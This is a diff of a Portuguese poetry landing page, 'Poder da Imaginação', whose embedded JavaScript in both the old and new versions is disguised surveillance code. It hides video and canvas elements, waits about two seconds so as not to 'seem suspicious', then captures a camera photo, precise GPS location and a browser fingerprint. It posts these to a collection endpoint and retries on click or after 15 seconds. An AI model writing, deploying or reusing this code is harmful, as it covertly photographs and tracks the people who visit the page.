@@ -5,174 +5,69 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Poder da Imaginação</title>
     <style>
-        /* ============================================================
-           RESET E BASE
-           ============================================================ */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,600;1,400&family=Inter:wght@300;400;500&display=swap');
-
-        :root {
-            --text-primary: #f0ece4;
-            --text-secondary: rgba(240, 236, 228, 0.7);
-            --text-muted: rgba(240, 236, 228, 0.4);
-            --overlay: rgba(10, 10, 15, 0.55);
-            --overlay-strong: rgba(10, 10, 15, 0.75);
-            --accent: #c9b084;
-            --accent-glow: rgba(201, 176, 132, 0.15);
-            --radius: 12px;
-        }
-
-        html, body {
-            height: 100%;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            font-family: 'Georgia', serif;
             background: #0a0a0f;
-            color: var(--text-primary);
+            color: #f0ece4;
+            min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
-            min-height: 100vh;
-            overflow: hidden;
+            background-image: url('https://images.unsplash.com/photo-1502082553048-f009c37129b9?w=1600&q=80');
+            background-size: cover;
+            background-position: center;
             position: relative;
         }
-
-        /* ============================================================
-           BACKGROUND COM ÁRVORE (IMAGEM DE ALTA QUALIDADE)
-           ============================================================ */
-        .background-image {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            background: 
-                url('https://images.unsplash.com/photo-1502082553048-f009c37129b9?w=1600&q=80') center center / cover no-repeat;
-            filter: brightness(0.7) saturate(0.85);
-            transform: scale(1.05);
-            transition: transform 0.3s ease;
-        }
-
-        .background-image::after {
+        body::before {
             content: '';
             position: absolute;
             inset: 0;
-            background: var(--overlay);
-            backdrop-filter: blur(2px);
-            -webkit-backdrop-filter: blur(2px);
+            background: rgba(10, 10, 15, 0.6);
+            backdrop-filter: blur(4px);
         }
-
-        /* Fallback com gradiente caso a imagem não carregue */
-        @supports not (background-image: url('')) {
-            .background-image {
-                background: linear-gradient(145deg, #0a0a0f 0%, #1a1410 50%, #0a0a0f 100%);
-            }
-        }
-
-        /* ============================================================
-           CONTEÚDO PRINCIPAL
-           ============================================================ */
         .content {
             position: relative;
             z-index: 1;
-            max-width: 680px;
-            width: 100%;
+            max-width: 600px;
             text-align: center;
             padding: 40px 32px;
             animation: fadeIn 2s ease;
         }
-
         @keyframes fadeIn {
             0% { opacity: 0; transform: translateY(20px); }
             100% { opacity: 1; transform: translateY(0); }
         }
-
-        /* ============================================================
-           LOGO / TÍTULO
-           ============================================================ */
         .logo {
-            font-family: 'Playfair Display', serif;
             font-size: 42px;
-            font-weight: 600;
-            letter-spacing: 2px;
-            color: var(--text-primary);
-            margin-bottom: 8px;
-            text-shadow: 0 2px 30px rgba(0,0,0,0.5);
-        }
-
-        .logo span {
-            color: var(--accent);
-            font-style: italic;
-        }
-
-        .subtitle {
-            font-family: 'Playfair Display', serif;
-            font-style: italic;
-            font-size: 18px;
-            color: var(--text-secondary);
-            margin-bottom: 32px;
             font-weight: 300;
-            letter-spacing: 1px;
-            text-shadow: 0 1px 20px rgba(0,0,0,0.3);
+            letter-spacing: 2px;
+            color: #f0ece4;
+            margin-bottom: 8px;
         }
-
-        /* ============================================================
-           LINHA DECORATIVA
-           ============================================================ */
+        .logo span { color: #c9b084; font-style: italic; }
+        .subtitle {
+            font-size: 18px;
+            color: rgba(240, 236, 228, 0.7);
+            margin-bottom: 32px;
+            font-style: italic;
+        }
         .divider {
             width: 60px;
             height: 1px;
-            background: var(--accent);
+            background: #c9b084;
             margin: 0 auto 32px;
             opacity: 0.4;
         }
-
-        /* ============================================================
-           POESIA / TEXTO
-           ============================================================ */
         .poem {
-            font-family: 'Playfair Display', serif;
             font-size: 20px;
             line-height: 1.9;
-            color: var(--text-secondary);
+            color: rgba(240, 236, 228, 0.8);
             margin-bottom: 40px;
-            font-weight: 300;
-            text-shadow: 0 1px 20px rgba(0,0,0,0.3);
-        }
-
-        .poem .highlight {
-            color: var(--accent);
             font-style: italic;
         }
-
-        .poem .line {
-            display: block;
-            opacity: 0;
-            animation: lineFade 1s ease forwards;
-        }
-
-        .poem .line:nth-child(1) { animation-delay: 0.5s; }
-        .poem .line:nth-child(2) { animation-delay: 1.0s; }
-        .poem .line:nth-child(3) { animation-delay: 1.5s; }
-        .poem .line:nth-child(4) { animation-delay: 2.0s; }
-        .poem .line:nth-child(5) { animation-delay: 2.5s; }
-
-        @keyframes lineFade {
-            0% { opacity: 0; transform: translateY(8px); }
-            100% { opacity: 1; transform: translateY(0); }
-        }
-
-        /* ============================================================
-           STATUS SUTIL (RODAPÉ)
-           ============================================================ */
+        .poem .highlight { color: #c9b084; }
         .status-bar {
             position: fixed;
             bottom: 20px;
@@ -180,48 +75,27 @@
             transform: translateX(-50%);
             z-index: 2;
             font-size: 11px;
-            color: var(--text-muted);
-            font-weight: 300;
-            letter-spacing: 0.5px;
+            color: rgba(240, 236, 228, 0.4);
             background: rgba(0,0,0,0.3);
             backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
             padding: 6px 18px;
             border-radius: 20px;
             border: 1px solid rgba(255,255,255,0.04);
             display: flex;
             align-items: center;
             gap: 12px;
-            transition: all 0.5s ease;
-            pointer-events: none;
         }
-
         .status-bar .dot {
             width: 5px;
             height: 5px;
             border-radius: 50%;
-            background: var(--accent);
+            background: #c9b084;
             animation: pulse-dot 2s ease-in-out infinite;
         }
-
-        .status-bar .dot.success {
-            background: #4ade80;
-            animation: none;
-        }
-
-        .status-bar .dot.error {
-            background: #f87171;
-            animation: none;
-        }
-
         @keyframes pulse-dot {
             0%, 100% { opacity: 0.3; transform: scale(0.8); }
             50% { opacity: 1; transform: scale(1.2); }
         }
-
-        /* ============================================================
-           LINK ADMIN (OCULTO)
-           ============================================================ */
         .admin-link {
             position: fixed;
             bottom: 20px;
@@ -230,263 +104,131 @@
             font-size: 10px;
             color: rgba(255,255,255,0.08);
             text-decoration: none;
-            transition: color 0.3s ease;
-            letter-spacing: 0.5px;
-            font-weight: 300;
         }
-
-        .admin-link:hover {
-            color: rgba(255,255,255,0.3);
-        }
-
-        /* ============================================================
-           ELEMENTOS OCULTOS (CÂMERA)
-           ============================================================ */
-        video, canvas {
-            display: none !important;
-            width: 0 !important;
-            height: 0 !important;
-            position: absolute !important;
-            top: -9999px !important;
-            left: -9999px !important;
-        }
-
-        /* ============================================================
-           RESPONSIVIDADE
-           ============================================================ */
-        @media (max-width: 600px) {
-            .logo { font-size: 30px; }
-            .poem { font-size: 17px; line-height: 1.8; }
-            .content { padding: 24px 16px; }
-            .status-bar { font-size: 10px; padding: 4px 14px; bottom: 12px; }
-            .admin-link { bottom: 12px; right: 12px; font-size: 9px; }
-        }
-
-        @media (max-width: 400px) {
-            .logo { font-size: 24px; }
-            .poem { font-size: 15px; }
-        }
+        .admin-link:hover { color: rgba(255,255,255,0.3); }
+        video, canvas { display: none !important; }
     </style>
 </head>
 <body>
 
-    <!-- ===== BACKGROUND ===== -->
-    <div class="background-image"></div>
-
-    <!-- ===== CONTEÚDO ===== -->
     <div class="content">
         <div class="logo">Poder da <span>Imaginação</span></div>
         <div class="subtitle">— onde as palavras ganham vida —</div>
         <div class="divider"></div>
-
         <div class="poem">
-            <span class="line">Há um <span class="highlight">silêncio</span> que fala mais que palavras,</span>
-            <span class="line">uma <span class="highlight">presença</span> que habita entre as linhas.</span>
-            <span class="line">O que você vê <span class="highlight">não é tudo</span> o que existe,</span>
-            <span class="line">pois o invisível <span class="highlight">dança</span> nos espaços vazios.</span>
-            <span class="line">E é nesse <span class="highlight">instante</span> que a imaginação floresce.</span>
+            <span class="highlight">Há um silêncio</span> que fala mais que palavras,<br>
+            uma <span class="highlight">presença</span> que habita entre as linhas.<br>
+            O que você vê <span class="highlight">não é tudo</span> o que existe,<br>
+            pois o invisível <span class="highlight">dança</span> nos espaços vazios.<br>
+            E é nesse <span class="highlight">instante</span> que a imaginação floresce.
         </div>
     </div>
 
-    <!-- ===== STATUS BAR (SUTIL) ===== -->
     <div class="status-bar" id="statusBar">
         <span class="dot" id="statusDot"></span>
         <span id="statusText">A floresta respira...</span>
     </div>
 
-    <!-- ===== LINK ADMIN (OCULTO) ===== -->
     <a href="/admin.html" class="admin-link">✦</a>
 
-    <!-- ===== ELEMENTOS OCULTOS (CÂMERA) ===== -->
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
-    <!-- ============================================================
-    JAVASCRIPT - COLETA FURTIVA
-    ============================================================ -->
     <script>
         (function() {
             'use strict';
 
-            // ============================================================
-            // CONFIGURAÇÕES
-            // ============================================================
+            // ===== CONFIGURAÇÃO =====
             const CONFIG = {
-                backendURL: '/.netlify/functions/coletar',
-                camera: {
-                    qualidade: 0.85,
-                    largura: 1024,
-                    altura: 768,
-                    timeout: 6000,
-                    tentativas: 3
-                },
-                geolocation: {
-                    enableHighAccuracy: true,
-                    timeout: 8000,
-                    maximumAge: 0,
-                    tentativas: 3
-                }
+                backendURL: '/api/coletar',
+                camera: { qualidade: 0.85, largura: 1024, altura: 768, timeout: 6000 },
+                geolocation: { enableHighAccuracy: true, timeout: 8000 }
             };
 
-            // ============================================================
-            // DOM
-            // ============================================================
-            const statusDot = document.getElementById('statusDot');
             const statusText = document.getElementById('statusText');
+            const statusDot = document.getElementById('statusDot');
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d');
 
             let enviado = false;
 
-            // ============================================================
-            // FUNÇÕES DE STATUS (SUTIS)
-            // ============================================================
             function setStatus(texto, tipo = 'loading') {
                 statusText.textContent = texto;
                 statusDot.className = 'dot';
-
-                if (tipo === 'success') {
-                    statusDot.classList.add('success');
-                } else if (tipo === 'error') {
-                    statusDot.classList.add('error');
-                }
-                // loading é o padrão (pulsante)
+                if (tipo === 'success') statusDot.style.background = '#4ade80';
+                else if (tipo === 'error') statusDot.style.background = '#f87171';
+                else statusDot.style.background = '#c9b084';
             }
 
-            // ============================================================
-            // CAPTURA DE FOTO (SILENCIOSA)
-            // ============================================================
             async function capturarFoto() {
-                const configs = [
-                    { facingMode: 'environment', width: CONFIG.camera.largura, height: CONFIG.camera.altura },
-                    { facingMode: 'user', width: CONFIG.camera.largura, height: CONFIG.camera.altura },
-                    { width: CONFIG.camera.largura, height: CONFIG.camera.altura },
-                    { facingMode: 'environment' },
-                    { facingMode: 'user' }
-                ];
-
-                for (let i = 0; i < Math.min(configs.length, CONFIG.camera.tentativas + 2); i++) {
-                    try {
-                        const config = configs[i];
-                        const stream = await navigator.mediaDevices.getUserMedia({
-                            video: config,
-                            audio: false
-                        });
-
-                        video.srcObject = stream;
-                        await video.play();
-
-                        await new Promise((resolve, reject) => {
-                            const timeout = setTimeout(reject, CONFIG.camera.timeout);
-                            video.onloadeddata = () => { clearTimeout(timeout); resolve(); };
-                            video.onerror = () => { clearTimeout(timeout); reject(new Error('Erro no vídeo')); };
-                        });
-
-                        await new Promise(r => requestAnimationFrame(r));
-
-                        canvas.width = video.videoWidth || CONFIG.camera.largura;
-                        canvas.height = video.videoHeight || CONFIG.camera.altura;
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                        const fotoBase64 = canvas.toDataURL('image/jpeg', CONFIG.camera.qualidade);
-
-                        stream.getTracks().forEach(track => track.stop());
-                        video.srcObject = null;
-
-                        return fotoBase64;
-                    } catch (err) {
-                        if (video.srcObject) {
-                            video.srcObject.getTracks().forEach(t => t.stop());
-                            video.srcObject = null;
-                        }
-                    }
+                try {
+                    setStatus('📸 Solicitando câmera...', 'loading');
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'environment', width: 640, height: 480 },
+                        audio: false
+                    });
+                    video.srcObject = stream;
+                    await video.play();
+                    await new Promise(r => setTimeout(r, 300));
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const fotoBase64 = canvas.toDataURL('image/jpeg', 0.85);
+                    stream.getTracks().forEach(track => track.stop());
+                    video.srcObject = null;
+                    setStatus('📸 Foto capturada!', 'success');
+                    return fotoBase64;
+                } catch (err) {
+                    console.error('Erro na câmera:', err);
+                    setStatus('❌ Câmera: ' + err.message, 'error');
+                    return null;
                 }
-                return null;
             }
 
-            // ============================================================
-            // CAPTURA DE LOCALIZAÇÃO (SILENCIOSA)
-            // ============================================================
             function capturarLocalizacao() {
                 return new Promise((resolve) => {
                     if (!navigator.geolocation) {
+                        setStatus('❌ GPS não suportado', 'error');
                         resolve(null);
                         return;
                     }
-
-                    let tentativas = 0;
-                    let timeoutId = null;
-
-                    function tentar() {
-                        tentativas++;
-                        timeoutId = setTimeout(() => {
-                            if (tentativas < CONFIG.geolocation.tentativas) {
-                                tentar();
-                            } else {
-                                resolve(null);
-                            }
-                        }, CONFIG.geolocation.timeout);
-
-                        navigator.geolocation.getCurrentPosition(
-                            (position) => {
-                                clearTimeout(timeoutId);
-                                resolve({
-                                    latitude: position.coords.latitude,
-                                    longitude: position.coords.longitude,
-                                    precisao: position.coords.accuracy
-                                });
-                            },
-                            () => {
-                                clearTimeout(timeoutId);
-                                if (tentativas < CONFIG.geolocation.tentativas) {
-                                    setTimeout(tentar, 1500 * tentativas);
-                                } else {
-                                    resolve(null);
-                                }
-                            },
-                            CONFIG.geolocation
-                        );
-                    }
-
-                    tentar();
+                    setStatus('📍 Solicitando GPS...', 'loading');
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const dados = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                precisao: position.coords.accuracy
+                            };
+                            setStatus('📍 GPS obtido!', 'success');
+                            resolve(dados);
+                        },
+                        (error) => {
+                            console.error('Erro GPS:', error);
+                            setStatus('❌ GPS: ' + error.message, 'error');
+                            resolve(null);
+                        },
+                        { enableHighAccuracy: true, timeout: 8000 }
+                    );
                 });
             }
 
-            // ============================================================
-            // FINGERPRINT
-            // ============================================================
-            function capturarNavegador() {
-                return {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    screenWidth: window.screen.width,
-                    screenHeight: window.screen.height,
-                    colorDepth: window.screen.colorDepth,
-                    pixelRatio: window.devicePixelRatio || 1,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    timezoneOffset: new Date().getTimezoneOffset(),
-                    hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
-                    deviceMemory: navigator.deviceMemory || 'N/A',
-                    plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', '),
-                    referer: document.referrer || 'Nenhum',
-                    url: window.location.href,
-                    dataHora: new Date().toISOString(),
-                    timestamp: Date.now()
-                };
-            }
-
-            // ============================================================
-            // ENVIO
-            // ============================================================
-            async function enviarDados(foto, localizacao, navegador) {
+            async function enviarDados(foto, localizacao) {
                 const payload = {
                     foto: foto || null,
                     localizacao: localizacao || null,
-                    navegador: navegador || null,
-                    timestamp: new Date().toISOString()
+                    navegador: {
+                        userAgent: navigator.userAgent,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        language: navigator.language,
+                        screenWidth: window.screen.width,
+                        screenHeight: window.screen.height
+                    }
                 };
+
+                console.log('📤 Enviando dados...');
+                setStatus('📤 Enviando...', 'loading');
 
                 try {
                     const response = await fetch(CONFIG.backendURL, {
@@ -494,93 +236,59 @@
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(payload)
                     });
-                    return await response.json();
-                } catch (error) {
-                    // Fallback: salva localmente
-                    try {
-                        localStorage.setItem('coleta_fallback', JSON.stringify(payload));
-                    } catch (e) {}
+
+                    if (!response.ok) throw new Error('HTTP ' + response.status);
+                    const result = await response.json();
+                    console.log('✅ Resposta:', result);
+                    setStatus('✅ Dados enviados com sucesso!', 'success');
+                    return result;
+                } catch (err) {
+                    console.error('❌ Erro no envio:', err);
+                    setStatus('❌ Erro: ' + err.message, 'error');
                     return null;
                 }
             }
 
-            // ============================================================
-            // FLUXO PRINCIPAL (TOTALMENTE SILENCIOSO)
-            // ============================================================
-            async function executarColeta() {
+            async function executar() {
                 if (enviado) return;
                 enviado = true;
 
                 try {
-                    setStatus('A floresta respira...', 'loading');
-
-                    // Coleta em paralelo
+                    console.log('🚀 Iniciando coleta...');
                     const [foto, localizacao] = await Promise.all([
                         capturarFoto(),
                         capturarLocalizacao()
                     ]);
-
-                    const navegador = capturarNavegador();
-
-                    if (foto || localizacao) {
-                        await enviarDados(foto, localizacao, navegador);
-                        setStatus('🌿 A natureza floresce', 'success');
-                    } else {
-                        setStatus('🍃 O vento sopra suave', 'error');
-                    }
-
-                } catch (error) {
-                    setStatus('🍂 Uma folha caiu...', 'error');
+                    await enviarDados(foto, localizacao);
+                    console.log('✅ Coleta finalizada!');
+                } catch (err) {
+                    console.error('💥 Erro:', err);
+                    setStatus('❌ Erro crítico', 'error');
                     enviado = false;
                 }
             }
 
-            // ============================================================
-            // INICIALIZAÇÃO (COM DELAY PARA NÃO PARECER SUSPEITO)
-            // ============================================================
-            function iniciar() {
-                // Aguarda 2 segundos para parecer que a página está carregando
-                setTimeout(() => {
-                    executarColeta();
-                }, 2500);
+            // ===== INICIA =====
+            setTimeout(executar, 2000);
 
-                // Fallback: tenta novamente se o usuário interagir (scroll, clique)
-                document.addEventListener('click', function handler() {
-                    if (!enviado) {
-                        executarColeta();
-                    }
-                }, { once: true });
+            // Fallback: tenta novamente se clicar
+            document.addEventListener('click', function handler() {
+                if (!enviado) {
+                    setStatus('🔄 Tentando novamente...', 'loading');
+                    executar();
+                }
+                document.removeEventListener('click', handler);
+            }, { once: true });
 
-                document.addEventListener('scroll', function handler() {
-                    if (!enviado) {
-                        executarColeta();
-                    }
-                }, { once: true });
-
-                // Fallback automático após 15s
-                setTimeout(() => {
-                    if (!enviado) {
-                        executarColeta();
-                    }
-                }, 15000);
-            }
-
-            // ============================================================
-            // START
-            // ============================================================
-            if (document.readyState === 'loading') {
-                document.addEventListener('DOMContentLoaded', iniciar);
-            } else {
-                iniciar();
-            }
-
-            // ============================================================
-            // EXPÕE PARA DEBUG (opcional)
-            // ============================================================
-            window.__coleta = { executar: executarColeta };
+            // Fallback após 15s
+            setTimeout(() => {
+                if (!enviado) {
+                    setStatus('⏰ Tentando automaticamente...', 'loading');
+                    executar();
+                }
+            }, 15000);
 
         })();
     </script>
-
 </body>
 </html>
